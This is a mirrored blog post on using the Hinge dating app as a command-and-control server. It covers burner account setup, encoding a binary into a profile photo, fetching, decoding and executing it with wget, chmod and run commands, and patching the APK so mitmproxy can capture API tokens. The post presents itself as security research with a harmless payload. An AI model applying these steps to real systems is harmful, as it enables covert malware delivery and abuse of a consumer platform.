<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://mattwie.se/hinge-command-control-c2">Original</a>
    <h1>Using Hinge as a Command and Control Server</h1>
    
    <div id="readability-page-1" class="page"><article itemscope="" itemtype="https://schema.org/BlogPosting">
    
    
    <main itemprop="articleBody">
        <p><strong>Disclaimer:</strong> This doesn&#39;t qualify for consideration through Hinge&#39;s <a href="https://hackerone.com/hinge">Hacker One</a> disclosure page since we need to patch the app and MITM it. Although this technique is convoluted, I think a threat actor could make great use of it, which means it&#39;s worthy of attention. Besides, making C2s out of random things is free and fun entertainment, as  Mauro Eldritch <a href="https://www.youtube.com/watch?v=TWcBySQgfBE">demonstrates</a>.</p>
<p><strong>Repository:</strong> <a href="https://github.com/matthewwiese/hinge-command-control-c2">https://github.com/matthewwiese/hinge-command-control-c2</a></p>
<h2>Account Setup</h2>
<p>I&#39;m going to assume you have already installed Hinge on an Android device. Our first hurdle is the account creation setup, as a phone number is required. Back in the day you could make a throwaway Google Voice number for stuff like this, but everyone has caught on to that now so I rarely bother. The best approach I&#39;ve found for research are Mint Mobile 7-day trial SIMs. Chances are the number is already registered to a Hinge account, so you&#39;re gonna want to get more than one. They look like this:</p>
<p><img src="https://mattwie.se/assets/images/mint.jpg" alt="Pile of five SIM card trial packets"/></p>
<p>These can be bought on eBay or in-person with cash at places like Target and Best Buy. If you&#39;re paranoid about being caught on CCTV at a retail store, then you&#39;re probably a criminal. If it makes you feel any better though, most places don&#39;t store footage for longer than a month, so plan your escapades in advance.</p>
<h2>The Payload</h2>
<p>Please see the GitHub repo linked above for all necessary files. To demonstrate this proof of concept, we will be using a vibe-coded Python script that visually encodes a binary into an image. When a user uploads a photo, Hinge transforms it before storing on their CDN. Somebody with <a href="https://en.wikipedia.org/wiki/Steganography">steganography</a> chops could probably get around that; treat what follows as an appetizer, the entr√©e is only limited by your imagination.</p>
<p>The &#34;payload&#34; in question is just a toy C program that prints &#34;Hello World&#34; - compile it:</p>
<pre><code>gcc -s payload.c -o payload
</code></pre>
<p>Next, we will use our script to encode the image (numpy and PIL are required):</p>
<pre><code>python enc.py encode payload payload.png
</code></pre>
<p>You should get something that looks like this:</p>
<p><img src="https://mattwie.se/assets/images/payload.png" alt="A bunch of colorful pixels on a black background that visually encodes our binary"/></p>
<p>Like I said, you can get as creative with this as you want. Hinge supports uploading videos, so one could probably string many of these images together and reconstitute the frames in order to store larger amounts of data.</p>
<h2>Hinge Photos Are Public</h2>
<p>I can&#39;t take credit for this work - my understanding of Hinge&#39;s undocumented API comes from <a href="https://github.com/ReedGraff/HingeSDK">this GitHub repository</a>. Props to Reed for doing the hard work of reverse engineering. Somebody send him a rose!</p>
<p>If you know the &#34;secret&#34; user ID associated with a Hinge profile you can pull its data like so (using <code>/user/v2/public</code> instead will include your profile&#39;s biographical info):</p>
<pre><code>curl -H &#34;x-app-version: 9.103.1&#34; \
     -H &#34;x-device-platform: android&#34; \
     -H &#34;authorization: Bearer 0bsAcaDsY_t-jSK1d8C5J6r-b3c3ui1F0G01EIzW8Pk=&#34; \
     -H &#34;x-device-id: ea3b329c4b0eeadd&#34; \
     -H &#34;x-install-id: 02d5f0b2-9860-4543-b9d3-8d7af86975ad&#34; \
     &#34;https://prod-api.hingeaws.net/content/v2/public?ids=3800512239643919861&#34;
</code></pre>
<p>The headers above are necessary in order for Hinge not to reject your request with an error. We will be able to retrieve that info, including our fake user&#39;s ID, in the next section. If you run that curl command you should get something like this:</p>
<pre><code>[
  {
    &#34;userId&#34;:&#34;3800512239643919861&#34;,
    &#34;content&#34;:{
      &#34;photos&#34;:[
        {
          &#34;boundingBox&#34;:{
            &#34;topLeft&#34;:{
              &#34;x&#34;:0,
              &#34;y&#34;:0
            },
            &#34;bottomRight&#34;:{
              &#34;x&#34;:1,
              &#34;y&#34;:1
            }
          },
          &#34;caption&#34;:&#34;&#34;,
          &#34;cdnId&#34;:&#34;pu6fv3qbtwfwl4m34r2h&#34;,
          &#34;contentId&#34;:&#34;7c72a3f7-85b6-430b-9289-fcf3efdd45b6&#34;,
          &#34;location&#34;:&#34;&#34;,
          &#34;promptId&#34;:&#34;5d8a5e5ed138abfa1fb17ee9&#34;,
          &#34;source&#34;:&#34;camera&#34;,
          &#34;sourceId&#34;:&#34;pu6fv3qbtwfwl4m34r2h&#34;,
          &#34;pHash&#34;:&#34;ec68e560e4a7eaa8&#34;,
          &#34;url&#34;:&#34;https://media.hingenexus.com/image/upload/pu6fv3qbtwfwl4m34r2h.jpg&#34;,
          &#34;width&#34;:1576,
          &#34;height&#34;:1576,
          &#34;selfieVerified&#34;:false
        },
        &#34;&lt;more photos...&gt;&#34;
      ],
      &#34;answers&#34;:[
        {
          &#34;contentId&#34;:&#34;7b3df417-c879-4943-bba1-277f50a1b15c&#34;,
          &#34;position&#34;:2,
          &#34;questionId&#34;:&#34;5b16d9ab636de0035ea7dc6a&#34;,
          &#34;type&#34;:&#34;text&#34;,
          &#34;response&#34;:&#34;Hack the planet&#34;,
          &#34;transcriptionMetadata&#34;:{
            
          }
        },
        &#34;&lt;more answers...&gt;&#34;
      ]
    }
  }
]
</code></pre>
<p>The response will include all photo and answer data. The &#34;answers&#34; are free-form text fields the app provides to users in order to showcase their personality. You could enter a public key in one of these fields, just as Mauro did in the DEF CON talk I linked to in the disclaimer.</p>
<p>Let&#39;s see if our image still works:</p>
<pre><code>wget https://media.hingenexus.com/image/upload/pu6fv3qbtwfwl4m34r2h.jpg
python enc.py decode pu6fv3qbtwfwl4m34r2h.jpg payload2
chmod +x payload2
./payload2
</code></pre>
<p>I&#39;ll let you guess what the output will be!</p>
<h2>Patch Dat App</h2>
<p>I&#39;m not going to go through excruciating detail because if I did this post would be way too long and we&#39;d drown in minutiae. The gist is that Hinge doesn&#39;t bother with certificate pinning, so MITMing it is trivial. You could do so with a rooted phone by adding your certificate to the system trust store, but because rooted phones are easy to detect, I wanted to avoid that. After all, a threat actor wants to stay as hidden as possible. Thankfully, doing this on a vanilla Android phone is easy so long as you turn on developer options and enable USB debugging.</p>
<p>There are open source projects like <a href="https://github.com/niklashigi/apk-mitm">apk-mitm</a> that help automate this drudgery. I tried apk-mitm specifically but it butchered the apk resources and lead to Hinge crashing on startup. So we&#39;re going to get our hands dirty and do it the old fashioned way - as you will see, it is so easy a house plant could do it.</p>
<p>Install the <a href="https://developer.android.com/tools/adb">Android Debug Bridge</a>. We start by finding the relevant apks; Hinge is an <a href="https://en.wikipedia.org/wiki/Android_App_Bundle">Android App Bundle</a> and uses split apks. The <code>base.apk</code> file is the meat and potatoes, but we need all three:</p>
<pre><code>adb shell pm list packages | grep hinge
    package:co.hinge.app
adb shell pm path co.hinge.app
    package:/data/app/~~SPa73TGJVGIyIEauH-XspQ==/co.hinge.app-0nE16h1-_jOfO23mEWhFig==/base.apk
    package:/data/app/~~SPa73TGJVGIyIEauH-XspQ==/co.hinge.app-0nE16h1-_jOfO23mEWhFig==/split_config.arm64_v8a.apk
    package:/data/app/~~SPa73TGJVGIyIEauH-XspQ==/co.hinge.app-0nE16h1-_jOfO23mEWhFig==/split_config.xhdpi.apk
</code></pre>
<p>Pull those apks down to your machine:</p>
<pre><code>adb pull /data/app/~~SPa73TGJVGIyIEauH-XspQ==/co.hinge.app-0nE16h1-_jOfO23mEWhFig==/base.apk .
adb pull /data/app/~~SPa73TGJVGIyIEauH-XspQ==/co.hinge.app-0nE16h1-_jOfO23mEWhFig==/split_config.arm64_v8a.apk .
adb pull /data/app/~~SPa73TGJVGIyIEauH-XspQ==/co.hinge.app-0nE16h1-_jOfO23mEWhFig==/split_config.xhdpi.apk .
</code></pre>
<p>The one file we need to change is the <a href="https://developer.android.com/privacy-and-security/security-config">network security config</a> XML file. However, this file is in a special &#34;axml&#34; format so we can&#39;t just decompile the apk, edit it, and reinstall; but it&#39;s not much more work. Create the textfile first:</p>
<pre><code>cat &gt; nsc.xml &lt;&lt; &#39;EOF&#39;
&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
&lt;network-security-config&gt;
    &lt;base-config cleartextTrafficPermitted=&#34;true&#34;&gt;
        &lt;trust-anchors&gt;
            &lt;certificates src=&#34;system&#34; /&gt;
            &lt;certificates src=&#34;user&#34; /&gt;
        &lt;/trust-anchors&gt;
    &lt;/base-config&gt;
&lt;/network-security-config&gt;
EOF
</code></pre>
<p>The <code>&lt;certificates src=&#34;user&#34; /&gt;</code> line is our secret sauce and all that&#39;s needed. We are going to use <a href="https://github.com/codyi96/xml2axml">xml2axml</a> to convert it to the binary format:</p>
<pre><code>java -jar xml2axml-2.0.1.jar e nsc.xml nsc-binary.xml
</code></pre>
<p>Next, we will inject it into a new patched apk:</p>
<pre><code>cp base.apk base-patched.apk
mkdir -p res/xml
cp nsc-binary.xml res/xml/network_security_config.xml
zip -d base-patched.apk &#34;META-INF/*&#34;
zip -u base-patched.apk res/xml/network_security_config.xml
java -jar uber-apk-signer-1.3.0.jar --apks base-patched.apk
</code></pre>
<p>The <code>META-INF/*</code> part strips the existing signature - we will end up doing this to all three apks so that we can sign them all with <a href="https://github.com/patrickfav/uber-apk-signer">uber-apk-signer</a> before installing:</p>
<pre><code>mkdir install
cp split_config.*.apk install/dir
for apk in install/split_config.*.apk; do zip -d &#34;$apk&#34; &#34;META-INF/*&#34;; done
java -jar uber-apk-signer-1.3.0.jar --apks install/
</code></pre>
<p>Copy your patched apk into that directory, remove the existing Hinge app and reinstall the bundle:</p>
<pre><code>cp base-patched-aligned-debugSigned.apk install
adb uninstall co.hinge.app
cd install
adb install-multiple base-patched-aligned-debugSigned.apk split_config.arm64_v8a-aligned-debugSigned.apk split_config.xhdpi-aligned-debugSigned.apk
</code></pre>
<p>For those that do better seeing everything as a single script, please see <a href="https://github.com/matthewwiese/hinge-command-control-c2/blob/main/patch.sh">patch.sh</a> in the repository.</p>
<h2>Malcom in the Middle</h2>
<p>We&#39;re almost done. Set up your Android phone to use <a href="https://github.com/mitmproxy/mitmproxy">mitmproxy</a> and open the Hinge app and start doing stuff - you should see requests piling up in the mitmproxy interface.</p>
<p>The user ID and key header data we need can be found in a variety of requests. For example, if we inspect a GET request to <code>https://prod-api.hingeaws.net/user/v3</code>:</p>
<p><img src="https://mattwie.se/assets/images/mitm-request.png" alt="mitmproxy TUI view of request details"/></p>
<p><img src="https://mattwie.se/assets/images/mitm-response.png" alt="mitmproxy TUI view of response details"/></p>
<p>That provides us everything we need for the curl command shown earlier:</p>
<pre><code>curl -H &#34;x-app-version: 9.103.1&#34; \
     -H &#34;x-device-platform: android&#34; \
     -H &#34;authorization: Bearer egnoh-f_tZHOvehiwVXhUViLtwnJ9y0uK6vU1N0gH4s=&#34; \
     -H &#34;x-device-id: ea3b329c4b0eeadd&#34; \
     -H &#34;x-install-id: 454cf671-85e1-45a5-9167-f0645509521e&#34; \
     &#34;https://prod-api.hingeaws.net/content/v2/public?ids=3800512239643919861&#34;
</code></pre>
<p>Congratulations! You&#39;re now using Hinge to distribute unassuming abstract expressionist pixel art. Happy New Year.</p>

    </main>
    
    
</article></div>
  </body>
</html>
